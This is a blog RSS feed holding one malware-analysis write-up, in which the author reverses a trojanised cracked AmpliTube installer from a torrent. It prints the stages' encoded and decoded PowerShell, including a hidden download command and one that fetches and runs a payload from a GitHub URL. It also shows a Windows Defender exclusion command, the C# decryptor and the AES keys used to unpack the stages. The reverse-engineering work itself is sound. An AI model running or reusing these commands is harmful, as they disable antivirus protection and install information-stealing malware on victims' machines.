@@ -1,0 +1,195 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+      <title>Indirekt</title>
+        <link>https://example.com/blog</link>
+        <description>My blog</description>
+        <generator>Zola</generator>
+        <language>en</language>
+        <atom:link href="https://example.com/blog/rss.xml" rel="self" type="application/rss+xml"/>
+        <lastBuildDate>Sat, 19 Feb 2022 00:00:00 +0000</lastBuildDate>
+        <item>
+            <title>Team R2R Torrent Malware</title>
+            <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate>
+            <link>https://example.com/blog/posts/torrent-malware/</link>
+            <guid>https://example.com/blog/posts/torrent-malware/</guid>
+            <description>&lt;p&gt;&lt;em&gt;&lt;strong&gt;Disclaimer: I do not condone pirating software, this was done out of research reasons and practice in learning to reverse malware.&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;premise&quot;&gt;Premise&lt;&#x2F;h2&gt;
+&lt;p&gt;I recently thought of how wild the early internet was in terms of pirating. Distinctly, I remember Limewire and the many peers of mine that got malware from downloading songs. So I was curious, is the landscape the same?&lt;&#x2F;p&gt;
+&lt;p&gt;So... I had to think of an area where malware would be easiest to deploy to unsuspecting &lt;em&gt;pirates&lt;&#x2F;em&gt; which led to programs that require installation. After a bit of research, I started to see a couple of the same uploader names for vastly distinct types of software. I could go with something like the Adobe Suite, but why not try something esoteric and something that I recently got into, namely a great piece of software called Amplitube. It is a guitar amp and pedal simulator that many different musicians use.&lt;&#x2F;p&gt;
+&lt;p&gt;So I got a Windows 11 VM and downloaded the torrent&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;the-file-name-and-hashes&quot;&gt;The File Name and Hashes:&lt;&#x2F;h2&gt;
+&lt;pre&gt;&lt;code&gt;Filename:
+-   IK Multimedia AmpliTube 5 Complete v5.5.2.rar
+MD5:
+-   CA02A4F843D7590A468FC6646986635D
+SHA1:
+-   92428ED88411BCE0E31422EE8CA559D161D5C572
+SHA256:
+-   B31466A1DBD5E4E012E82E6C9FFC13D83713C40B193CFE75BABB715D7A0C6733
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;examining-the-rar-archive&quot;&gt;Examining the RAR Archive:&lt;&#x2F;h2&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;1_rar_unpacked.png&quot;&gt;
+&lt;p&gt;Opening the RAR archive we see a number of files, with the only thing immediatly perking my interest being the &amp;quot;Setup.exe&amp;quot;
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;2_rar_unpacked.png&quot;&gt;
+&lt;p&gt;Going into the R2R directory from the previous image we see another executable and a text file named &amp;quot;R2R.txt&amp;quot; which is most likely a readme to explain how to install the pirated software.
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;3_R2R_text_file.png&quot;&gt;
+&lt;p&gt;The theory was right and it appears to want us to restrict the software from calling out to domains and then to run their keygen software. Thus wanting to create a product key that fits the software licensing software and disallows the program from validating the key externally.
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;&#x2F;h3&gt;
+&lt;p&gt;We can guess all day how malware might operate, but running it and seeing it operate in real time helps us understand what happens. So we run installer&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;7_keygen_blocked.png&quot;&gt;
+&lt;p&gt;From the start we can see that defender doesn&#x27;t like the keygen software. This might be caused by the fact its a keygen which has its own category in many of the malware sandboxes.
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;4_keygen.png&quot;&gt;
+&lt;p&gt;Once we add the exception, we can see that this executable is not just custom for the one version of the software we installed but for many other versions of the software suite as well as others by the vendor that makes the software.&lt;&#x2F;p&gt;
+&lt;p&gt;I clicked the &amp;quot;Automatic Registration&amp;quot; button and was met with a message suggesting that whatever was done was successful. 
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;5_win_defender.png&quot;&gt;
+&lt;p&gt;I try to run the &amp;quot;Setup.exe&amp;quot; file and was met with another Windows Defender message with a different signature but more importantly, a different file and path than the exe.
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;6_custom_installer.png&quot;&gt;
+&lt;p&gt;Finally I see what appears to be another custom written software, this time an installer. But from the previous image, we have something we can look at &amp;gt;:)
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;reversing-the-batch-file&quot;&gt;Reversing the Batch File:&lt;&#x2F;h2&gt;
+&lt;p&gt;The batch file does a number of things that will be explained below.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;checking-if-admin&quot;&gt;Checking if Admin&lt;&#x2F;h3&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;8_batch_file_admin_check.png&quot;&gt;
+&lt;p&gt;The first blob we can see performs a check to see if we are running as Admin
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;9_download_net_framework.png&quot;&gt;
+&lt;p&gt;The next is a bit convoluted as its base64&#x27;d, but GCHQ has us covered with CyberChef.&lt;&#x2F;p&gt;
+&lt;p&gt;The Raw blob&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;PowerShell&quot; class=&quot;language-PowerShell &quot;&gt;&lt;code class=&quot;language-PowerShell&quot; data-lang=&quot;PowerShell&quot;&gt;powershell.exe -nologo -noprofile -WindowStyle hidden -exec bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBOAEUAVAAtAEYAcgBhAG0AZQBXAG8AcgBrAC0AeAA2ADQALwBOAEUAVAAvAHIAYQB3AC8AbQBhAGkAbgAvAE4ARQBUAEYAcgBhAG0AZQB3AG8AcgBrAC4AegBpAHAAJwAsACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAE4ARQBUAEYAcgBhAG0AZQB3AG8AcgBrAC4AegBpAHAAJwApADsAIABFAHgAcABhAG4AZAAtAEEAcgBjAGgAaQB2AGUAIAAnAEMAOgBcAFAAcgBvAGcAcgBhAG0AIABGAGkAbABlAHMAXABOAEUAVABGAHIAYQBtAGUAdwBvAHIAawAuAHoAaQBwACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAJwBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzAFwAJwA=
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The decrypted base64&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;(New-Object System.Net.WebClient).DownloadFile(&amp;#x27;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;NET-FrameWork-x64&amp;#x2F;NET&amp;#x2F;raw&amp;#x2F;main&amp;#x2F;NETFramework.zip&amp;#x27;,&amp;#x27;C:\Program Files\NETFramework.zip&amp;#x27;); Expand-Archive &amp;#x27;C:\Program Files\NETFramework.zip&amp;#x27; -DestinationPath &amp;#x27;C:\Program Files\&amp;#x27;
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Downloading the .Net Framework is quite common among a number of samples of malware I have analyzed. Not sure if this is a quincidence but they don&#x27;t really &lt;em&gt;Live off the Land&lt;&#x2F;em&gt;. &lt;&#x2F;p&gt;
+&lt;h3 id=&quot;setting-up-other-binaries&quot;&gt;Setting up other binaries&lt;&#x2F;h3&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;10_setting_up_other_binaries.png&quot;&gt;
+&lt;p&gt;The script appears to be setting up a new binary that it is going to execute. Three variables are seen performing this:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;$IsPOwf
+&lt;ul&gt;
+&lt;li&gt;This is an array of the batch files itself split up by each &lt;em&gt;newline&lt;&#x2F;em&gt; character.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;$TuhVUs
+&lt;ul&gt;
+&lt;li&gt;This is grabbing the last element in the &lt;em&gt;$IsPOwf&lt;&#x2F;em&gt; array&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;$GkHpVD
+&lt;ul&gt;
+&lt;li&gt;This is setting a variable from a base64 blob&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;what-tuhvus-is&quot;&gt;What $TuhVUs is:&lt;&#x2F;h4&gt;
+&lt;p&gt;At the end of the file is a base64 blob whihc is what the &lt;em&gt;$TuhVUs&lt;&#x2F;em&gt; is being set to. From this, we can try and decode the start of the block to get a rough idea of what it is.&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;7gmsis4zGlbX33hptrwtYpv0jI6Wg&amp;#x2F;qqU&amp;#x2F;FnnlJfJjew1jN3DTq1QhPZI3P6l0iLt4nkXjEBsPEyB3Fyz6cKEK3PNmgmLhxQKvtkOp8+kq2yT9mckclrHUCXj73z7PY
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Getting it into a hexdump shows us nothing of value, no text nor does the first couple bytes match any known magic numbers&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;11_base64_blob_at_end_of_script.png&quot;&gt;
+&lt;h4 id=&quot;what-gkhpvd-is&quot;&gt;What $GkHpVD is:&lt;&#x2F;h4&gt;
+&lt;p&gt;This is a decoded blob that was made easier to read with some minor formatting.&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;using System.Text;
+using System.IO;
+using System.IO.Compression;
+using System.Security.Cryptography; 
+public class qksbYX { 
+    public static byte[] QsEBoF(byte[] input, byte[] key, byte[] iv) { 
+        AesManaged aes = new AesManaged(); 
+        aes.Mode = CipherMode.CBC; 
+        aes.Padding = PaddingMode.PKCS7; 
+        ICryptoTransform decryptor = aes.CreateDecryptor(key, iv); 
+        byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length); 
+        decryptor.Dispose(); 
+        aes.Dispose(); 
+        return decrypted; 
+    } 
+    public static byte[] UjqOKM(byte[] bytes) { 
+        MemoryStream msi = new MemoryStream(bytes); 
+        MemoryStream mso = new MemoryStream(); 
+        var gs = new GZipStream(msi, CompressionMode.Decompress); 
+        gs.CopyTo(mso); 
+        gs.Dispose(); 
+        msi.Dispose(); 
+        mso.Dispose(); 
+        return mso.ToArray(); 
+    }
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We can now get a sense of what is being created with a class &lt;em&gt;qksbYX&lt;&#x2F;em&gt; being created with two functions &lt;em&gt;QsEBoF&lt;&#x2F;em&gt; and &lt;em&gt;UjqOKM&lt;&#x2F;em&gt;. The two functions are an AES decryption function and GZIP decompression function respectively.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;decompression-decryption&quot;&gt;Decompression &#x2F; Decryption&lt;&#x2F;h4&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;12_aes_gzip_method_called.png&quot;&gt;
+&lt;p&gt;We can break down the steps as follows:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;We can see on line 17 that the AES decryption method &lt;em&gt;QsEBoF&lt;&#x2F;em&gt; is called&lt;&#x2F;li&gt;
+&lt;li&gt;The &lt;em&gt;$TuhVUs&lt;&#x2F;em&gt; base64 blob is being thrown into &lt;em&gt;QsEBoF&lt;&#x2F;em&gt; as the input. (Yellow Line)&lt;&#x2F;li&gt;
+&lt;li&gt;Line 18 shows a base64 string that is the key is put into next (Blue Line)&lt;&#x2F;li&gt;
+&lt;li&gt;Line 19 shows a base64 string that is the IV (initialization vector) (Pastel Orange Line)&lt;&#x2F;li&gt;
+&lt;li&gt;We see that the output from &lt;em&gt;QsEBoF&lt;&#x2F;em&gt; is thrown into &lt;em&gt;UjqOKM&lt;&#x2F;em&gt;, the GZIP decompressor.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h2 id=&quot;getting-the-next-stage-from-the-binary&quot;&gt;Getting the Next Stage from the Binary&lt;&#x2F;h2&gt;
+&lt;p&gt;We have the data an now are going to get the next stage.&lt;&#x2F;p&gt;
+&lt;p&gt;Compact recipe for cyberchef with the &lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;[{&amp;quot;op&amp;quot;:&amp;quot;From Base64&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;A-Za-z0-9+&amp;#x2F;=&amp;quot;,true,false]},{&amp;quot;op&amp;quot;:&amp;quot;To Hex&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;Space&amp;quot;,0]},{&amp;quot;op&amp;quot;:&amp;quot;AES Decrypt&amp;quot;,&amp;quot;args&amp;quot;:[{&amp;quot;option&amp;quot;:&amp;quot;Base64&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;VvTxOHMdT0RLUkr2glQl+fj&amp;#x2F;r8v03A6LTCQxRimeHHA=&amp;quot;},{&amp;quot;option&amp;quot;:&amp;quot;Base64&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;UimbybecKJ23KCAcIq5n6Q==&amp;quot;},&amp;quot;CBC&amp;#x2F;NoPadding&amp;quot;,&amp;quot;Hex&amp;quot;,&amp;quot;Raw&amp;quot;,{&amp;quot;option&amp;quot;:&amp;quot;Hex&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;&amp;quot;},{&amp;quot;option&amp;quot;:&amp;quot;Hex&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;&amp;quot;}]},{&amp;quot;op&amp;quot;:&amp;quot;To Hexdump&amp;quot;,&amp;quot;args&amp;quot;:[16,false,false,false]}]
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;13_cyberchef_gzip_output.png&quot;&gt;
+&lt;p&gt;We put the data in cyberchef and see this as the output
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;14_magic_bytes.png&quot;&gt;
+&lt;p&gt;This matches the magic bytes for GZIP.
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;[{&amp;quot;op&amp;quot;:&amp;quot;From Base64&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;A-Za-z0-9+&amp;#x2F;=&amp;quot;,true,false]},
+{&amp;quot;op&amp;quot;:&amp;quot;To Hex&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;Space&amp;quot;,0]},
+{&amp;quot;op&amp;quot;:&amp;quot;AES Decrypt&amp;quot;,&amp;quot;args&amp;quot;:[{&amp;quot;option&amp;quot;:&amp;quot;Base64&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;VvTxOHMdT0RLUkr2glQl+fj&amp;#x2F;r8v03A6LTCQxRimeHHA=&amp;quot;},
+{&amp;quot;option&amp;quot;:&amp;quot;Base64&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;UimbybecKJ23KCAcIq5n6Q==&amp;quot;},&amp;quot;CBC&amp;quot;,&amp;quot;Hex&amp;quot;,&amp;quot;Raw&amp;quot;,
+{&amp;quot;option&amp;quot;:&amp;quot;Hex&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;&amp;quot;},{&amp;quot;option&amp;quot;:&amp;quot;Hex&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;&amp;quot;}]},
+{&amp;quot;op&amp;quot;:&amp;quot;Gunzip&amp;quot;,&amp;quot;args&amp;quot;:[]}]
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;15_we_see_mz.png&quot;&gt;
+&lt;p&gt;Using the above recipe, we finally see the coveted MZ, which denotes a Windows executable.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;the-new-executable&quot;&gt;The New Executable&lt;&#x2F;h2&gt;
+&lt;p&gt;I&#x27;m getting tired, so im speedrunning the last bits.&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;16_ghidra_aes_method.png&quot;&gt;
+&lt;p&gt;I load up the executable into Ghidra and perform the auto analysis feature. I then check the methods and see &lt;em&gt;lBWjGjldEM&lt;&#x2F;em&gt; sticking out like a sore thumb.&lt;&#x2F;p&gt;
+&lt;p&gt;It appears that the software is doing the same thing as the Batch script (using AES and maybe GZIP)
+&lt;br&gt;&lt;br&gt;&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;17_ghidra_stage1_strings.png&quot;&gt;
+&lt;p&gt;I then use the strings command and see a couple base64 strings which might fit the either the Key or IV.&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;18_base64_blob_in_exe.png&quot;&gt;
+&lt;p&gt;I then look for the base64 blob that will undergo the AES decryption and GZIP decompression and find it within the exe.&lt;&#x2F;p&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;19_base64_blog_stage2_in_cyberchef.png&quot;&gt;
+&lt;p&gt;Cyberchef recipe:&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;[{&amp;quot;op&amp;quot;:&amp;quot;From Base64&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;A-Za-z0-9+&amp;#x2F;=&amp;quot;,true,false]},{&amp;quot;op&amp;quot;:&amp;quot;To Hex&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;Space&amp;quot;,0]},{&amp;quot;op&amp;quot;:&amp;quot;AES Decrypt&amp;quot;,&amp;quot;args&amp;quot;:[{&amp;quot;option&amp;quot;:&amp;quot;Base64&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;BGEViV16vt66fe6j8Nlg7r9iR3X5UD&amp;#x2F;a68hBI&amp;#x2F;65QLw=&amp;quot;},{&amp;quot;option&amp;quot;:&amp;quot;Base64&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;ks7qn3RTE8td8eYW&amp;#x2F;WRA3w==&amp;quot;},&amp;quot;CBC&amp;quot;,&amp;quot;Hex&amp;quot;,&amp;quot;Raw&amp;quot;,{&amp;quot;option&amp;quot;:&amp;quot;Hex&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;&amp;quot;},{&amp;quot;option&amp;quot;:&amp;quot;Hex&amp;quot;,&amp;quot;string&amp;quot;:&amp;quot;&amp;quot;}]},{&amp;quot;op&amp;quot;:&amp;quot;Gunzip&amp;quot;,&amp;quot;args&amp;quot;:[]}]
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;20_next_mz.png&quot;&gt;
+&lt;p&gt;Ok we have the next MZ, hopefully this isnt a recursive thing...&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;stage-3&quot;&gt;Stage 3&lt;&#x2F;h2&gt;
+&lt;p&gt;We load the next stage in Ghidra again and perform the auto analysis feature again.&lt;&#x2F;p&gt;
+&lt;p&gt;First thing I notice is no encryption libraries, which means this might be the last stage.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;using-strings-reveals-all&quot;&gt;Using Strings reveals all&lt;&#x2F;h3&gt;
+&lt;img src=&quot;&#x2F;img&#x2F;torrent_malware&#x2F;21_strings_reveals_all.png&quot;&gt;
+&lt;p&gt;We now see some interesting string that give us insight into what the exe is doing:&lt;&#x2F;p&gt;
+&lt;p&gt;We see that exe is setting a defender exclusion rule &lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;Add-MpPreference -ExclusionPath C:\\ -ExclusionExtension exe ; Add-MpPreference -ExclusionPath C:\\ -ExclusionExtension &amp;#x27;exe&amp;#x27;,&amp;#x27;zip&amp;#x27; ; @(&amp;#x27;
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We then see that the software is performing a download &lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#x27; ;(New-Object System.Net.WebClient).DownloadFile($_,$fileName);Expand-Archive -LiteralPath $fileName -DestinationPath $env:APPDATA;Invoke-Item $env:APPDATA\\wininfo64\\lib32.exe }
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Finally, we see where the file is being downloaded:&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;alibaba2044&amp;#x2F;1337L2&amp;#x2F;raw&amp;#x2F;main&amp;#x2F;wininfo64.zip
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Unfortanately, the file hosted on GitHub was not up, so we attempt to pivot to VirusTotal with the closest thing being &lt;a href=&quot;https:&#x2F;&#x2F;www.virustotal.com&#x2F;gui&#x2F;file&#x2F;2681a33478967ac0953785eac5f3b924c5159b6137ae96a619943c8dd1c8131b&quot;&gt;this&lt;&#x2F;a&gt;. There is already a good writeup about that file if it is indeed the next stage.https:&#x2F;&#x2F;blog.cluster25.duskrise.com&#x2F;2022&#x2F;12&#x2F;22&#x2F;an-infostealer-comes-to-town. (for those wondering about how I got to the VT link, it wasn&#x27;t just the name, it stemmed from VT&#x27;s relations feature, which linked the same account.)&lt;&#x2F;p&gt;
+</description>
+        </item>
+    </channel>
+</rss>
